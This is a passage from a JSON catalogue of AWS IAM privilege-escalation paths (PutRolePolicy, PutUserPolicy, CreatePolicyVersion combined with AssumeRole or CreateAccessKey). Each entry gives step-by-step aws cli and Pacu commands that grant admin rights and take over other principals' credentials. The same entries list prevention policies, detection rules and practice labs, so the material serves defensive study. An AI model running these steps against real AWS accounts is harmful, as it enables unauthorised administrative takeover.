      "sts-001"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L129",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L1079",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L24"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-createpolicyversion+sts-assumerole",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-CreateNewPolicyVersion",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal initiating the attack. Can be an IAM user or role with both `iam:CreatePolicyVersion` permission on a customer-managed policy and `sts:AssumeRole` permission on a target role. The customer-managed policy must be attached to the target role that the principal can assume.\n"
        },
        {
          "id": "customer_policy",
          "label": "customer-managed-policy",
          "type": "resource",
          "description": "A customer-managed IAM policy that is attached to the target role. The starting principal has `iam:CreatePolicyVersion` permission for this specific policy ARN, allowing them to create new versions with elevated permissions. This policy acts as the pivot point for the attack - by modifying it, the attacker can elevate the permissions of any principal that has it attached.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Target Role",
          "type": "resource",
          "description": "An IAM role that has the customer-managed policy attached to it. The starting principal has `sts:AssumeRole` permission for this role. Once the attacker modifies the customer-managed policy to grant administrative permissions, this role inherits those elevated privileges. The role must have a trust policy that allows the starting principal to assume it.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "Full administrative access to the AWS account. The attacker achieves this by first creating a new version of the customer-managed policy with administrative permissions (setting it as the default), then using `sts:AssumeRole` to assume the target role which now has those elevated privileges. The assumed role credentials provide full administrative access to the AWS environment.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "customer_policy",
          "label": "iam:CreatePolicyVersion",
          "description": "The attacker uses `iam:CreatePolicyVersion` to create a new version of the customer-managed policy with administrative permissions and sets it as the default version.\n\nCommand:\n```bash\naws iam create-policy-version \\\n  --policy-arn \"arn:aws:iam::ACCOUNT_ID:policy/customer-policy-name\" \\\n  --policy-document file://admin_policy.json \\\n  --set-as-default\n```\n\nWhere admin_policy.json contains a policy document granting full administrative access. The `--set-as-default` flag makes this new version active immediately, so any principal with this policy attached (including the target role) instantly gains these elevated permissions.\n"
        },
        {
          "from": "customer_policy",
          "to": "target_role",
          "label": "Policy attached to role",
          "description": "The customer-managed policy is attached to the target role. This is a prerequisite condition that must exist for the attack to work. When the policy is modified to include administrative permissions, the target role automatically inherits those new permissions. The attacker needs to identify this relationship beforehand, typically using `iam:ListEntitiesForPolicy` or `iam:ListAttachedRolePolicies` permissions.\n"
        },
        {
          "from": "target_role",
          "to": "admin",
          "label": "sts:AssumeRole",
          "description": "The attacker uses `sts:AssumeRole` to assume the target role, which now has administrative permissions via the modified customer-managed policy.\n\nCommand:\n```bash\naws sts assume-role \\\n  --role-arn \"arn:aws:iam::ACCOUNT_ID:role/target-role-name\" \\\n  --role-session-name \"privesc-session\"\n```\n\nThe API returns temporary security credentials (AccessKeyId, SecretAccessKey, SessionToken) that have full administrative access. Configure these credentials in the AWS CLI or SDK to perform administrative actions:\n\n```bash\nexport AWS_ACCESS_KEY_ID=<AccessKeyId>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey>\nexport AWS_SESSION_TOKEN=<SessionToken>\n\n# Verify administrative access\naws iam list-users\n```\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-07T04:00:34Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-016.yaml"
  },
  {
    "id": "iam-017",
    "name": "iam:PutRolePolicy + sts:AssumeRole",
    "category": "lateral-movement",
    "services": [
      "iam",
      "sts"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:PutRolePolicy",
          "resourceConstraints": "Must have permission on the target role ARN"
        },
        {
          "permission": "sts:AssumeRole",
          "resourceConstraints": "Must have permission to assume the target role, and the role must trust the attacking principal"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles that can be modified and assumed"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies to identify assumable roles"
        },
        {
          "permission": "iam:ListRolePolicies",
          "resourceConstraints": "Helpful for viewing current inline policies on the target role"
        },
        {
          "permission": "iam:GetRolePolicy",
          "resourceConstraints": "Useful for viewing inline policy details before and after modification"
        }
      ]
    },
    "description": "This is a variation of `iam:PutRolePolicy` (iam-005). This variation is needed when you have `iam:PutRolePolicy` permission on another role (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a different role and then assuming it. This requires both `iam:PutRolePolicy` on the target role AND `sts:AssumeRole` permission. Critically, the target role must also be configured with a trust policy that explicitly allows your principal to assume it. You add an inline policy with administrative permissions directly to the target role, then assume that role to gain the elevated privileges. Inline policies are embedded directly in IAM roles and are often overlooked during security reviews because they are not visible as standalone policy objects, making this privilege escalation technique less visible than managed policy attachments.",
    "prerequisites": {
      "admin": [
        "A target role must exist that you have `iam:PutRolePolicy` permission on",
        "You must have `sts:AssumeRole` permission scoped to the target role",
        "**Critical**: The target role must have a trust policy that explicitly allows your principal to assume it (e.g., your user or role ARN must be in the Principal element of the role's trust policy)"
      ],
      "lateral": [
        "A target role must exist that you have `iam:PutRolePolicy` permission on",
        "You must have `sts:AssumeRole` permission scoped to the target role",
        "**Critical**: The target role must have a trust policy that explicitly allows your principal to assume it (e.g., your user or role ARN must be in the Principal element of the role's trust policy)"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table",
          "description": "List all roles to identify targets with trust policies that allow the attacking principal to assume them"
        },
        {
          "step": 2,
          "command": "aws iam get-role --role-name TARGET_ROLE",
          "description": "Check the trust policy of a specific role to verify the attacking principal can assume it"
        },
        {
          "step": 3,
          "command": "aws iam list-role-policies --role-name TARGET_ROLE",
          "description": "List current inline policies on the target role to verify existing permissions (optional)"
        },
        {
          "step": 4,
          "command": "aws iam put-role-policy \\\n  --role-name TARGET_ROLE \\\n  --policy-name AdminInlinePolicy \\\n  --policy-document '{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n      {\n        \"Effect\": \"Allow\",\n        \"Action\": \"*\",\n        \"Resource\": \"*\"\n      }\n    ]\n  }'\n",
          "description": "Create an inline policy with administrative permissions and attach it directly to the target role"
        },
        {
          "step": 5,
          "command": "sleep 15",
          "description": "Wait for the policy to propagate across AWS infrastructure (typically takes 10-15 seconds)"
        },
        {
          "step": 6,
          "command": "aws iam list-role-policies --role-name TARGET_ROLE",
          "description": "Verify the inline policy was successfully attached to the target role (optional)"
        },
        {
          "step": 7,
          "command": "aws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \\\n  --role-session-name privesc-session\n",
          "description": "Assume the target role to gain the elevated permissions from the inline policy"
        },
        {
          "step": 8,
          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 7>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 7>\nexport AWS_SESSION_TOKEN=<SessionToken from step 7>\n",
          "description": "Configure the AWS CLI to use the assumed role credentials"
        },
        {
          "step": 9,
          "command": "aws sts get-caller-identity",
          "description": "Verify the assumed role identity"
        },
        {
          "step": 10,
          "command": "aws iam list-users --max-items 3",
          "description": "Verify administrative access by testing a privileged operation"
        }
      ],
      "pacu": [
        {
          "step": 1,
          "command": "run iam__enum_permissions",
          "description": "Enumerate IAM permissions and identify roles that can be modified and assumed"
        },
        {
          "step": 2,
          "command": "run iam__privesc_scan",
          "description": "Scan for IAM privilege escalation opportunities including PutRolePolicy + AssumeRole combinations"
        },
        {
          "step": 3,
          "command": "run iam__put_role_policy --role-name TARGET_ROLE --policy-name AdminInlinePolicy --policy-file admin_policy.json",
          "description": "Use Pacu to add an inline policy with admin permissions to the target role"
        },
        {
          "step": 4,
          "command": "run iam__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE",
          "description": "Assume the privileged role using Pacu"
        }
      ]
    },
    "limitations": "The target role's trust policy must explicitly allow the attacking principal (or a principal they can access) to assume it. Some organizations may have SCPs that deny inline policy modifications on certain roles. The attacking principal needs both `iam:PutRolePolicy` and `sts:AssumeRole` permissions on the same target role for this path to work. Policy changes may take a few seconds to propagate before they become effective. If the role has a permission boundary, the inline policy will be constrained by that boundary.\n",
    "recommendation": "To prevent this privilege escalation path:\n\n**1. Restrict inline policy management permissions:**\nLimit `iam:PutRolePolicy`, `iam:PutUserPolicy`, and `iam:PutGroupPolicy` to only trusted administrators. These permissions allow direct modification of principal permissions without the visibility of managed policies.\n\n**2. Implement least privilege for role assumption:**\nOnly grant `sts:AssumeRole` permission to principals that have a legitimate business need to assume specific roles. Use resource-level restrictions to limit which roles can be assumed:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"sts:AssumeRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificAllowedRole\"\n}\n```\n\n**3. Use SCPs to prevent inline policy creation:**\nDeploy Service Control Policies (SCPs) that deny `iam:Put*Policy` actions for sensitive roles, even if IAM permissions allow it:\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Deny\",\n      \"Action\": [\n        \"iam:PutRolePolicy\",\n        \"iam:PutUserPolicy\",\n        \"iam:PutGroupPolicy\"\n      ],\n      \"Resource\": [\n        \"arn:aws:iam::*:role/SensitiveRole*\",\n        \"arn:aws:iam::*:user/PrivilegedUser*\"\n      ]\n    }\n  ]\n}\n```\n\n**4. Monitor inline policy changes:**\nConfigure AWS CloudTrail alerts for `PutRolePolicy`, `PutUserPolicy`, and `PutGroupPolicy` API calls. These are high-risk actions that should be rare and closely monitored.\n\n**5. Prefer managed policies over inline policies:**\nManaged policies are more visible in security reviews and easier to audit. Consider blocking inline policy creation entirely for production environments.\n\n**6. Implement permission boundaries:**\nUse IAM permission boundaries on roles to set the maximum permissions that can be granted, even through inline policies.\n\n**7. Regular audits:**\nPeriodically audit all roles for inline policies, especially those with sensitive trust policies. Inline policies are less visible than managed policies and may be overlooked.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2018"
    },
    "references": [
      {
        "title": "AWS IAM Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "AWS-IAM-Privilege-Escalation - Method 12: Creating/updating an inline policy for a role",
        "url": "https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation"
      },
      {
        "title": "IAM Vulnerable - Privesc12 (IAM-PutRolePolicy)",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      },
      {
        "title": "AWS IAM Privilege Escalation Techniques - Hacking the Cloud",
        "url": "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
      },
      {
        "title": "Investigating Privilege Escalation Methods in AWS",
        "url": "https://bishopfox.com/blog/privilege-escalation-in-aws"
      }
    ],
    "relatedPaths": [
      "iam-001",
      "iam-005",
      "iam-007",
      "iam-012",
      "iam-014",
      "iam-016"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L125",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L618",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L108-L109"
    },
    "detectionRules": [
      {
        "platform": "CloudTrail",
        "ruleId": "PutRolePolicy-Monitoring",
        "url": "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference.html"
      }
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-putrolepolicy+sts-assumerole",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-PutRolePolicy",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamputrolepolicy-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "toolSupport": {
      "pmapper": true,
      "iamVulnerable": true,
      "pacu": true,
      "prowler": false
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal initiating the attack. Can be an IAM user or role with both `iam:PutRolePolicy` permission on a target role and `sts:AssumeRole` permission on that same role. The attacker uses these permissions to add an inline policy with administrative permissions to the target role, then assumes it to gain elevated privileges.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Target Role",
          "type": "resource",
          "description": "An IAM role that the starting principal can modify with inline policies and assume. The role must have a trust policy that allows the starting principal to assume it. The attacker adds an inline policy with administrative permissions directly to this role using `iam:PutRolePolicy`, which embeds the policy document within the role itself (unlike customer-managed policies which are separate resources).\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "Full administrative access to the AWS account. The attacker achieves this by first using `iam:PutRolePolicy` to add an inline policy with administrative permissions to the target role, then using `sts:AssumeRole` to assume that role and gain the elevated privileges. The assumed role credentials provide full administrative access to the AWS environment.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_role",
          "label": "iam:PutRolePolicy",
          "description": "The attacker uses `iam:PutRolePolicy` to add an inline policy with administrative permissions directly to the target role.\n\nCommand:\n```bash\naws iam put-role-policy \\\n  --role-name target-role-name \\\n  --policy-name AdminInlinePolicy \\\n  --policy-document file://admin_policy.json\n```\n\nWhere admin_policy.json contains a policy document granting full administrative access (e.g., `\"Action\": \"*\"`, `\"Resource\": \"*\"`). Unlike customer-managed policies, inline policies are embedded directly in the IAM entity (in this case, the role) and take effect immediately. The role instantly gains these elevated permissions.\n"
        },
        {
          "from": "target_role",
          "to": "admin",
          "label": "sts:AssumeRole",
          "description": "The attacker uses `sts:AssumeRole` to assume the target role, which now has administrative permissions via the newly added inline policy.\n\nCommand:\n```bash\naws sts assume-role \\\n  --role-arn \"arn:aws:iam::ACCOUNT_ID:role/target-role-name\" \\\n  --role-session-name \"privesc-session\"\n```\n\nThe API returns temporary security credentials (AccessKeyId, SecretAccessKey, SessionToken) that have full administrative access. Configure these credentials in the AWS CLI or SDK to perform administrative actions:\n\n```bash\nexport AWS_ACCESS_KEY_ID=<AccessKeyId>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey>\nexport AWS_SESSION_TOKEN=<SessionToken>\n\n# Verify administrative access\naws iam list-users\n```\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-07T04:00:34Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-017.yaml"
  },
  {
    "id": "iam-018",
    "name": "iam:PutUserPolicy + iam:CreateAccessKey",
    "category": "lateral-movement",
    "services": [
      "iam"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:PutUserPolicy",
          "resourceConstraints": "Must have access to add inline policies to the target user"
        },
        {
          "permission": "iam:CreateAccessKey",
          "resourceConstraints": "Must have permission to create access keys for the target user"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListUsers",
          "resourceConstraints": "Helpful for discovering available users to target"
        },
        {
          "permission": "iam:GetUser",
          "resourceConstraints": "Useful for retrieving target user details and verifying existence"
        },
        {
          "permission": "iam:ListUserPolicies",
          "resourceConstraints": "Helpful for viewing current inline policies on the target user before and after modification"
        },
        {
          "permission": "iam:GetUserPolicy",
          "resourceConstraints": "Useful for retrieving and examining the content of existing inline policies"
        },
        {
          "permission": "iam:ListAccessKeys",
          "resourceConstraints": "Useful for checking the number of existing access keys (AWS limit is 2 per user)"
        }
      ]
    },
    "description": "This is a variation of `iam:PutUserPolicy` (iam-007). This variation is needed when you have `iam:PutUserPolicy` permission on another user (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a different user and then authenticating as that user. Since the target is a user (not a role), you need `iam:CreateAccessKey` to create credentials for authentication, rather than using `sts:AssumeRole`. You add an inline policy with administrative permissions directly to the target user, create new access keys for that user, and then authenticate using those credentials to gain the elevated privileges. Unlike managed policy attachment, inline policies are embedded directly in the user object, making them less visible in some security reviews and IAM policy management tools.",
    "prerequisites": {
      "admin": [
        "A target IAM user must exist that you have `iam:PutUserPolicy` permission on",
        "You must have `iam:CreateAccessKey` permission scoped to the target user",
        "The target user must have fewer than 2 access keys (AWS enforces a limit of 2 access keys per IAM user)"
      ],
      "lateral": [
        "A target IAM user must exist that you have `iam:PutUserPolicy` permission on",
        "You must have `iam:CreateAccessKey` permission scoped to the target user",
        "The target user must have fewer than 2 access keys (AWS enforces a limit of 2 access keys per IAM user)"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# Set the target user name\nTARGET_USER=\"target-user-name\"\n",
          "description": "Define the target user that will be modified and compromised"
        },
        {
          "step": 2,
          "command": "# List existing access keys for the target user\naws iam list-access-keys --user-name $TARGET_USER\n",
          "description": "Verify that the target user has fewer than 2 access keys (AWS limit). If the user already has 2 keys, you must delete one first using iam:DeleteAccessKey permission."
        },
        {
          "step": 3,
          "command": "# Create an admin policy document\ncat > admin-policy.json <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"*\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n",
          "description": "Create a policy document with administrative permissions (all actions on all resources)"
        },
        {
          "step": 4,
          "command": "# Add the admin inline policy to the target user\naws iam put-user-policy \\\n  --user-name $TARGET_USER \\\n  --policy-name AdminEscalation \\\n  --policy-document file://admin-policy.json\n",
          "description": "Add the administrative inline policy to the target user using iam:PutUserPolicy"
        },
        {
          "step": 5,
          "command": "# Wait for IAM policy changes to propagate (15 seconds)\nsleep 15\n",
          "description": "Wait for the inline policy to propagate across AWS infrastructure"
        },
        {
          "step": 6,
          "command": "# Verify the inline policy was added\naws iam list-user-policies --user-name $TARGET_USER\n",
          "description": "Verify that the AdminEscalation inline policy is now attached to the target user"
        },
        {
          "step": 7,
          "command": "# Create new access keys for the target user\nCREDENTIALS=$(aws iam create-access-key \\\n  --user-name $TARGET_USER \\\n  --output json)\n\n# Extract the credentials\nNEW_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKey.AccessKeyId')\nNEW_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.AccessKey.SecretAccessKey')\n\necho \"New Access Key ID: $NEW_ACCESS_KEY_ID\"\necho \"New Secret Access Key: $NEW_SECRET_ACCESS_KEY\"\n",
          "description": "Create new access keys for the target user and extract the credentials"
        },
        {
          "step": 8,
          "command": "# Configure a new AWS CLI profile with the stolen credentials\naws configure set aws_access_key_id $NEW_ACCESS_KEY_ID --profile compromised-user\naws configure set aws_secret_access_key $NEW_SECRET_ACCESS_KEY --profile compromised-user\naws configure set region us-east-1 --profile compromised-user\n",
          "description": "Configure a new AWS CLI profile using the newly created access keys"
        },
        {
          "step": 9,
          "command": "# Verify administrative access using the new credentials\naws iam list-users --max-items 5 --profile compromised-user\n",
          "description": "Verify that you now have administrative access by listing IAM users with the compromised credentials"
        }
      ],
      "pacu": [
        {
          "step": 1,
          "command": "# Use Pacu to add an admin inline policy to the target user\nrun iam__put_user_policy --user-name target-user-name --policy-name AdminEscalation --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'\n",
          "description": "Use Pacu to add an administrative inline policy to the target user"
        },
        {
          "step": 2,
          "command": "# Use Pacu to create access keys for the target user\nrun iam__create_access_key --user-name target-user-name\n",
          "description": "Use Pacu to create new access keys for the target user and save them for authentication"
        },
        {
          "step": 3,
          "command": "# Switch to the newly created credentials\nswap_keys\n",
          "description": "Configure Pacu to use the newly created access keys for the target user"
        }
      ]
    },
    "limitations": "This attack requires that the starting principal has both permissions (iam:PutUserPolicy AND iam:CreateAccessKey) scoped to the same target user. If these permissions are scoped to different users, the attack path is not viable.\n\nAdditionally, the target user must have fewer than 2 access keys due to AWS's hard limit. If the user already has 2 keys, the attacker would need an additional permission (iam:DeleteAccessKey) to remove an existing key before creating a new one.\n\nThe attack provides administrative access because the attacker controls the inline policy document content. Unlike iam:AttachUserPolicy (which requires choosing from existing managed policies), iam:PutUserPolicy allows the attacker to embed any policy document directly into the user, guaranteeing administrative permissions regardless of what policies exist in the environment.\n\nInline policies can be harder to detect in security reviews because they are embedded in the user object rather than referenced as separate policy entities. Some IAM policy management tools may not highlight inline policies as prominently as managed policy attachments.\n",
    "recommendation": "Restrict `iam:PutUserPolicy` and `iam:CreateAccessKey` using the principle of least privilege. These permissions should rarely be granted together on the same target user, as this combination creates a direct privilege escalation path.\n\n**Prevention strategies:**\n\n1. Restrict `iam:PutUserPolicy` to prevent cross-user inline policy modification:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PutUserPolicy\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:user/${aws:username}\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:UserName\": \"${aws:username}\"\n    }\n  }\n}\n```\n\n2. Restrict `iam:CreateAccessKey` to prevent cross-user access key creation:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:CreateAccessKey\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:user/${aws:username}\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:UserName\": \"${aws:username}\"\n    }\n  }\n}\n```\n\n3. Use IAM permissions boundaries to limit the maximum permissions a user can have, even if administrative inline policies are added\n\n4. Separate the permissions - avoid granting both `iam:PutUserPolicy` and `iam:CreateAccessKey` to the same principal for other users\n\n5. Require MFA for sensitive inline policy operations and access key creation\n\n6. Implement regular audits of inline policies, as they can be less visible than managed policies in standard IAM reviews\n\n7. Use Service Control Policies (SCPs) to prevent the addition of overly permissive inline policies\n\n**Detection strategies:**\n\nMonitor CloudTrail for the following event patterns:\n- `PutUserPolicy` API calls where the calling principal differs from the target user\n- `CreateAccessKey` API calls where the calling principal differs from the target user\n- Sequential occurrences of `PutUserPolicy` followed by `CreateAccessKey` on the same user within a short time window\n- `PutUserPolicy` events with policy documents containing broad permissions (e.g., `\"Action\": \"*\"` or `\"Action\": \"iam:*\"`)\n- Access key creation events that follow inline policy modification events\n\nSet up CloudWatch alarms for unexpected changes to inline user policies and creation of access keys by non-self principals. Investigate any modifications to user inline policies combined with access key creation. Consider implementing automated responses to roll back suspicious inline policy changes.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2018"
    },
    "references": [
      {
        "title": "AWS IAM Privilege Escalation \u2013 Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "AWS IAM Privilege Escalation Methods (GitHub Repository)",
        "url": "https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation"
      },
      {
        "title": "AWS IAM Privilege Escalation Techniques - Hacking The Cloud",
        "url": "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
      },
      {
        "title": "Investigating Privilege Escalation Methods in AWS (Bishop Fox)",
        "url": "https://bishopfox.com/blog/privilege-escalation-in-aws"
      },
      {
        "title": "IAM Vulnerable - AWS IAM Privilege Escalation Playground",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "iam-001",
      "iam-002",
      "iam-003",
      "iam-014",
      "iam-015"
    ],
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "ruleId": "TBD",
        "url": "https://docs.datadoghq.com/security/default_rules/"
      }
    ],
    "toolSupport": {
      "pmapper": true,
      "iamVulnerable": true,
      "pacu": true,
      "prowler": true
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-putuserpolicy+iam-createaccesskey",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-PutUserPolicy and IAM-CreateAccessKey",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal initiating the attack. Can be an IAM user or role with both `iam:PutUserPolicy` and `iam:CreateAccessKey` permissions on the target user. This principal may have minimal or no administrative permissions initially, but the combination of these two permissions creates a complete privilege escalation path.\n"
        },
        {
          "id": "target_user",
          "label": "Existing target-user",
          "type": "resource",
          "description": "The IAM user being modified and compromised. Must be a valid IAM user with fewer than 2 existing access keys. Initially, this user may have minimal or no privileges. The attacker will create an inline policy granting administrative permissions and then create new access keys for authentication.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "Full administrative access to the AWS account. The attacker achieves this by first using `iam:PutUserPolicy` to create an inline policy on the target user with administrative permissions, then using `iam:CreateAccessKey` to create new access keys for authentication. This is a deterministic outcome since the attacker controls the policy document content and can grant themselves any permissions they choose.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_user",
          "label": "iam:PutUserPolicy",
          "description": "The attacker uses `iam:PutUserPolicy` to create or update an inline policy on the target user, granting administrative permissions.\n\nCommand:\n```bash\naws iam put-user-policy \\\n  --user-name target-user-name \\\n  --policy-name AdminPolicy \\\n  --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'\n```\n\nAfter this action, the target user has administrative permissions via an inline policy. The attacker must wait approximately 15 seconds for the IAM policy changes to propagate across AWS infrastructure.\n"
        },
        {
          "from": "target_user",
          "to": "admin",
          "label": "iam:CreateAccessKey + Authenticate",
          "description": "The attacker uses `iam:CreateAccessKey` to create new access keys for the now-privileged target user, then authenticates using those credentials.\n\nCommands:\n```bash\n# Create access keys\nCREDENTIALS=$(aws iam create-access-key \\\n  --user-name target-user-name \\\n  --output json)\n\nNEW_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKey.AccessKeyId')\nNEW_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.AccessKey.SecretAccessKey')\n\n# Configure profile with new credentials\naws configure set aws_access_key_id $NEW_ACCESS_KEY_ID --profile compromised\naws configure set aws_secret_access_key $NEW_SECRET_ACCESS_KEY --profile compromised\n\n# Use the compromised credentials\naws iam list-users --profile compromised\n```\n\nThese new access keys have full administrative permissions and can be used to perform any action in the AWS account. Unlike temporary credentials from AssumeRole, these access keys do not expire and remain valid until explicitly deactivated or deleted.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-07T04:00:34Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-018.yaml"
  },
  {
    "id": "iam-019",
    "name": "iam:AttachRolePolicy + iam:UpdateAssumeRolePolicy",
    "category": "lateral-movement",
    "services": [
      "iam"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:AttachRolePolicy",
          "resourceConstraints": "Must have permission to attach policies to the target role"
        },
        {
          "permission": "iam:UpdateAssumeRolePolicy",
          "resourceConstraints": "Must have permission to modify the trust policy of the target role"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to target"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        },
        {
          "permission": "iam:ListAttachedRolePolicies",
          "resourceConstraints": "Helpful for viewing current policies attached to the target role"
        }
      ]
    },
